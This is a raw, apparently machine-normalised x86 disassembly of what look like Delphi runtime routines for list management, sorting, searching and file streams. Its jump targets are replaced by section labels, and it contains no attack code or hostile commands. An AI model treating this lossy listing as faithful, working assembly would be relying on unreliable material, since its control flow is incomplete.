xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a452
mov eax [ ebp - 0x4 ]
call sub_403368
retn
sub_41a458
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41a4a5
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_404424
mov ecx eax
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_41af7c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a4ac
lea eax [ ebp - 0x4 ]
call sub_404164
retn
sub_41a4b8
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0xc ] 0x0
je r-xdata
lea eax [ ebx + 0xc ]
mov edx esi
call sub_405b1c
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov eax [ ebx + 0xc ]
mov edx [ eax ]
call [ edx + 0x10 ]
pop esi
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0xc ]
mov ecx [ eax ]
call [ ecx + 0xc ]
sub_41a4ec
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41a52f
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_40435c
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a536
lea eax [ ebp - 0x4 ]
call sub_404164
retn
sub_41a53c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41a5f0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_419b28
xor edx edx
push ebp
push sub_41a5d3
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a5da
mov eax [ ebp - 0x4 ]
call sub_419be4
retn
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax ebx
jmp r-xdata
mov dl [ ebx ]
test dl dl
je r-xdata
mov ecx ebx
sub ecx eax
lea edx [ ebp - 0x8 ]
xchg edx eax
call sub_404254
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
cmp [ ebx ] 0xd
jne r-xdata
sub dl 0xa
je r-xdata
cmp [ ebx ] 0xa
jne r-xdata
inc ebx
sub dl 0x3
jne r-xdata
inc ebx
inc ebx
sub_41a600
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41a676
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_41f114
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x8 ]
call sub_41f11c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a67d
lea eax [ ebp - 0xc ]
call sub_404164
retn
inc ebx
xor esi esi
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_420878
inc esi
dec ebx
jne r-xdata
sub_41a6a8
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x7 ]
jne r-xdata
or [ esi + 0x4 ] 0x4
mov [ esi + 0x7 ] bl
test [ esi + 0x4 ] 0x4
jne r-xdata
pop esi
pop ebx
retn
sub_41a6c4
push ebx
push esi
call sub_40371c
mov ebx edx
mov esi eax
xor eax eax
mov [ esi + 0x20 ] eax
mov [ esi + 0x24 ] eax
xor eax eax
mov [ esi + 0x28 ] eax
mov [ esi + 0x2c ] eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_419960
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x14 ] eax
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x28 ]
test bl bl
jle r-xdata
mov ecx eax
mov eax [ esi + 0x10 ]
mov edx [ r-xdata ]
call sub_404c00
pop esi
pop ebx
retn
mov eax esi
call sub_403704
sub_41a72c
push ebx
push esi
push edi
push ebp
push ecx
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0x8c ]
test al al
je r-xdata
mov eax [ ebx + 0x14 ]
mov [ esp ] eax
jmp r-xdata
push edi
mov ecx esi
mov edx [ esp + 0x4 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x88 ]
mov al [ ebx + 0x1d ]
sub al 0x1
jb r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
dec al
je r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_419cdc
jmp r-xdata
sub_41a7c8
push ebx
mov ebx eax
cmp [ ebx + 0x14 ] 0x0
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
mov ecx [ ebx + 0x14 ]
mov edx [ r-xdata ]
call sub_404c00
xor eax eax
mov [ ebx + 0x14 ] eax
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
sub_41a808
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_419cdc
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop esi
pop ebx
retn
sub eax esi
mov ecx eax
shl ecx 0x3
mov eax [ ebx + 0x10 ]
lea edx [ eax + esi * 8 ]
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 + 0x8 ]
call sub_4028e8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 ]
mov edx [ r-xdata ]
call sub_404cec
dec [ ebx + 0x14 ]
mov eax [ ebx + 0x14 ]
cmp esi eax
jge r-xdata
sub_41a874
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_419cdc
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov edx [ rw-data ]
mov ecx edi
mov eax ebx
call sub_419cdc
cmp edi [ ebx + 0x14 ]
jl r-xdata
test edi edi
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_41a8d0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_41a8d0
push ebx
mov ebx [ eax + 0x10 ]
lea edx [ ebx + edx * 8 ]
mov eax [ eax + 0x10 ]
lea eax [ eax + ecx * 8 ]
mov ecx [ edx ]
mov ebx [ eax ]
mov [ edx ] ebx
mov [ eax ] ecx
mov ecx [ edx + 0x4 ]
mov ebx [ eax + 0x4 ]
mov [ edx + 0x4 ] ebx
mov [ eax + 0x4 ] ecx
pop ebx
retn
sub_41a8f4
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edi eax
mov [ esp + 0x8 ] 0x0
xor esi esi
mov eax [ edi + 0x14 ]
dec eax
mov [ esp + 0xc ] eax
cmp esi [ esp + 0xc ]
jg r-xdata
mov eax [ esp + 0x4 ]
mov [ eax ] esi
mov al [ esp + 0x8 ]
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebx [ esp + 0xc ]
add ebx esi
shr ebx 0x1
mov eax [ edi + 0x10 ]
mov edx [ eax + ebx * 8 ]
mov ecx [ esp ]
mov eax edi
mov ebp [ eax ]
call [ ebp + 0x34 ]
test eax eax
jge r-xdata
mov edx ebx
dec edx
mov [ esp + 0xc ] edx
test eax eax
jne r-xdata
lea esi [ ebx + 0x1 ]
jmp r-xdata
cmp esi [ esp + 0xc ]
jle r-xdata
mov [ esp + 0x8 ] 0x1
cmp [ edi + 0x1d ] 0x1
je r-xdata
mov esi ebx
sub_41a96c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_419cdc
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax edi
mov edx [ ebx + 0x10 ]
mov edx [ edx + esi * 8 ]
call sub_4041b8
pop edi
pop esi
pop ebx
retn
sub_41a9a8
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_419cdc
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax [ ebx + 0x10 ]
mov eax [ eax + esi * 8 + 0x4 ]
pop esi
pop ebx
retn
sub_41a9d0
push esi
mov edx [ eax + 0x18 ]
cmp edx 0x40
jle r-xdata
cmp edx 0x8
jle r-xdata
mov esi edx
test esi esi
jns r-xdata
mov esi 0x4
mov esi 0x10
jmp r-xdata
sar esi 0x2
jmp r-xdata
add esi 0x3
add esi edx
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x28 ]
pop esi
retn
sub_41aa04
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x8c ]
test al al
jne r-xdata
mov edx esi
mov eax ebx
call sub_419fa4
mov [ esp ] eax
jmp r-xdata
mov eax [ esp ]
pop edx
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_41aa50
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
je r-xdata
test esi esi
jl r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_419cdc
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_419cdc
cmp esi [ ebx + 0x14 ]
jle r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x88 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_41aaa4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x14 ]
cmp eax [ ebx + 0x18 ]
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp esi eax
jge r-xdata
mov eax ebx
call sub_41a9d0
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 ]
mov esi eax
xor eax eax
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
mov [ esi + 0x4 ] eax
mov eax esi
mov edx edi
call sub_4041b8
inc [ ebx + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov edx [ ebx + 0x10 ]
lea edx [ edx + esi * 8 + 0x8 ]
push edx
mov edx [ ebx + 0x10 ]
lea edx [ edx + esi * 8 ]
sub eax esi
mov ecx eax
shl ecx 0x3
mov eax edx
pop edx
call sub_4028e8
sub_41ab1c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
je r-xdata
test esi esi
jl r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_419cdc
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_419cdc
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 ]
mov edx edi
call sub_4041b8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_41ab78
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_419cdc
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
mov [ eax + esi * 8 + 0x4 ] edi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_41abb8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call [ ebp + 0x8 ]
test eax eax
jl r-xdata
inc ebx
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call [ ebp + 0x8 ]
test eax eax
jg r-xdata
dec esi
cmp esi ebx
jl r-xdata
cmp esi ebx
jge r-xdata
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41a8d0
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp esi [ ebp - 0x8 ]
jle r-xdata
cmp esi [ ebp - 0x10 ]
jne r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
mov [ ebp - 0x8 ] ebx
cmp ebx [ ebp - 0xc ]
jl r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41abb8
inc ebx
dec esi
mov [ ebp - 0x10 ] ebx
mov ebx [ ebp - 0x8 ]
mov esi [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0xc ]
shr eax 0x1
mov [ ebp - 0x10 ] eax
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_41ac68
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x1c ]
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov [ esi + 0x1c ] bl
mov eax esi
mov edx [ eax ]
call [ edx + 0x90 ]
sub_41acc4
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x14 ] 0x1
jle r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
push esi
mov ecx [ ebx + 0x14 ]
dec ecx
xor edx edx
mov eax ebx
call sub_41abb8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
sub_41ad18
add esp 0xfffffff8
push 0x0
push 0x0
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp ] eax
mov [ esp + 0x4 ] edx
mov eax [ esp ]
mov edx [ esp + 0x4 ]
pop ecx
pop edx
retn
sub_41ad4c
push ebx
add esp 0xfffffff0
mov ebx eax
push 0x0
push 0x0
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
push 0x0
push 0x0
mov dl 0x2
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp ] eax
mov [ esp + 0x4 ] edx
push [ esp + 0xc ]
push [ esp + 0xc ]
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ esp ]
mov edx [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_41adb0
push ebp
mov ebp esp
mov ecx eax
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
jl r-xdata
cmp [ ebp + 0x8 ] 0x80000000
jb r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bbf8
call sub_403b1c
cmp [ ebp + 0xc ] 0x0
jne r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x8 ]
mov edx eax
mov eax ecx
mov ecx [ eax ]
call [ ecx + 0x4 ]
pop ebp
retn 0x8
jmp r-xdata
sub_41ae04
push ebp
mov ebp esp
add esp 0xfffffef8
lea edx [ ebp - 0x108 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
call sub_4032b8
lea eax [ ebp - 0x108 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x4
lea eax [ ebp - 0x8 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc34
call sub_403b1c
mov esp ebp
pop ebp
retn
sub_41ae50
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
mov [ ebp - 0x1a ] cx
mov esi edx
mov [ ebp - 0x4 ] eax
lea ebx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ eax ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
call sub_4032b0
mov [ ebx ] eax
jmp r-xdata
cmp [ ebx ] 0x0
je r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
cmp eax [ r-xdata ]
jne r-xdata
mov [ ebp - 0x14 ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
push ebp
call sub_41ae04
pop ecx
mov eax [ ebx ]
call sub_4032f4
mov [ ebx ] eax
mov eax esi
cdq
push edx
push eax
mov dl [ ebp - 0x1a ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebp
call sub_41ae04
pop ecx
sub_41aed4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
jl r-xdata
cmp [ ebp + 0x8 ] 0x80000000
jb r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bbf8
call sub_403b1c
cmp [ ebp + 0xc ] 0x0
jne r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x8 ]
mov edx eax
xor ecx ecx
mov cl bl
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x14 ]
cdq
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
jmp r-xdata
sub_41af44
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov ecx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0xc ]
cmp ebx eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bbf8
call sub_403b1c
sub_41af7c
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov ecx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x10 ]
cmp ebx eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bbf8
call sub_403b1c
sub_41afb4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0xf000
jbe r-xdata
push 0x0
push 0x0
mov eax edi
call sub_41ad38
mov eax edi
mov edx [ eax ]
call [ edx ]
mov [ ebp + 0x8 ] eax
mov [ ebp + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x14 ] 0xf000
jmp r-xdata
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x14 ]
call sub_4026ec
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_41b090
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x14 ]
cdq
cmp edx [ ebp + 0xc ]
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
jge r-xdata
cmp eax [ ebp + 0x8 ]
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b097
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
call sub_40270c
retn
mov ebx [ ebp + 0x8 ]
mov ebx [ ebp - 0x14 ]
jmp r-xdata
jmp r-xdata
mov esi [ ebp - 0x18 ]
mov edx esi
mov ecx ebx
mov eax edi
call sub_41af44
mov edx esi
mov ecx ebx
mov eax [ ebp - 0x4 ]
call sub_41af7c
mov eax ebx
cdq
sub [ ebp + 0x8 ] eax
sbb [ ebp + 0xc ] edx
sub_41b0a8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx edx
push 0x1000
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41b72c
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41b0f8
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_41d760
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b0ff
mov eax [ ebp - 0x8 ]
call sub_403368
retn
sub_41b108
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403338
mov [ edi + 0x4 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036b4
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_41b164
push ebp
mov ebp esp
add esp 0xfffffff8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
and edx 0x7f
mov eax [ eax + 0x4 ]
call sub_4087b0
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop ecx
pop ecx
pop ebp
retn 0x8
sub_41b1a4
push ebp
mov ebp esp
push ebx
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ ebx + 0x4 ]
push eax
call SetEndOfFile
call sub_40cfd0
pop ebx
pop ebp
retn 0x8
sub_41b1cc
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov ax [ ebp + 0x8 ]
push eax
push 0x0
xor edx edx
mov eax esi
call sub_41b210
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036b4
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_41b210
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x1c ] ebx
test dl dl
je r-xdata
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi [ ebp + 0xc ]
xor eax eax
push ebp
push sub_41b339
push [ fs : eax ]
mov [ fs : eax ] esp
cmp di 0xffff
jne r-xdata
add esp 0xfffffff0
call sub_4036b4
movzx edx di
mov eax esi
call sub_4086d4
mov ecx eax
xor edx edx
mov eax ebx
call sub_41b108
cmp [ ebx + 0x4 ] 0x0
jge r-xdata
mov edx [ ebp + 0x8 ]
mov eax esi
call sub_408750
mov ecx eax
xor edx edx
mov eax ebx
call sub_41b108
cmp [ ebx + 0x4 ] 0x0
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b340
lea eax [ ebp - 0x24 ]
mov edx 0x4
call sub_404188
retn
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_408920
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
call GetLastError
lea edx [ ebp - 0x24 ]
call sub_40b334
mov eax [ ebp - 0x24 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0x14 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc34
call sub_403b1c
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_408920
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
call GetLastError
lea edx [ ebp - 0x1c ]
call sub_40b334
mov eax [ ebp - 0x1c ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0x14 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc34
call sub_403b1c
jmp r-xdata
sub_41b340
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_41b364
push ebx
push esi
call sub_40371c
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
test eax eax
jl r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403358
test bl bl
jle r-xdata
call sub_4087e8
pop esi
pop ebx
retn
mov eax esi
call sub_403704
sub_41b3a0
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0xc ]
test edi edi
jl r-xdata
xor esi esi
test ecx ecx
jl r-xdata
mov esi [ ebx + 0x8 ]
sub esi edi
test esi esi
jle r-xdata
cmp ecx esi
jge r-xdata
mov eax [ ebx + 0x4 ]
add eax edi
mov ecx esi
call sub_4028e8
add [ ebx + 0xc ] esi
jmp r-xdata
mov esi ecx
mov eax esi
pop edi
pop esi
pop ebx
retn
sub_41b3d8
sub cx 0x1
jb r-xdata
mov [ eax + 0xc ] edx
jmp r-xdata
je r-xdata
mov eax [ eax + 0xc ]
retn
add [ eax + 0xc ] edx
jmp r-xdata
dec cx
je r-xdata
add edx [ eax + 0x8 ]
mov [ eax + 0xc ] edx
jmp r-xdata
sub_41b3fc
push ebx
push esi
call sub_40371c
mov ebx edx
mov esi eax
mov eax esi
call sub_41b428
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403358
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403704
sub_41b440
push ebx
push esi
push edi
mov edi edx
mov esi eax
push 0x0
push 0x0
mov eax edi
call sub_41ad38
mov eax edi
mov edx [ eax ]
call [ edx ]
mov ebx eax
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x4 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ esi + 0x4 ]
mov ecx ebx
mov eax edi
call sub_41af44
sub_41b478
push ebx
push ecx
mov [ esp ] edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov edx eax
mov ecx [ ebx + 0x8 ]
mov eax ebx
call sub_41b398
mov eax [ esp ]
mov [ ebx + 0x10 ] eax
pop edx
pop ebx
retn
sub_41b4a0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0xc ]
mov edx esi
mov eax ebx
call sub_41b478
mov [ ebx + 0x8 ] esi
cmp esi edi
jge r-xdata
pop edi
pop esi
pop ebx
retn
mov cx 0x2
xor edx edx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x14 ]
sub_41b4cc
push ebx
push esi
push edi
cmp [ edx ] 0x0
jle r-xdata
mov esi [ eax + 0x4 ]
mov ecx esi
mov edi [ edx ]
mov ebx [ eax + 0x10 ]
cmp edi ebx
je r-xdata
mov ecx [ edx ]
cmp ecx [ eax + 0x8 ]
je r-xdata
mov eax ecx
pop edi
pop esi
pop ebx
retn
cmp [ edx ] 0x0
jne r-xdata
mov ecx [ edx ]
add ecx 0x1fff
and ecx 0xffffe000
mov [ edx ] ecx
test ebx ebx
jne r-xdata
mov eax esi
call sub_406e28
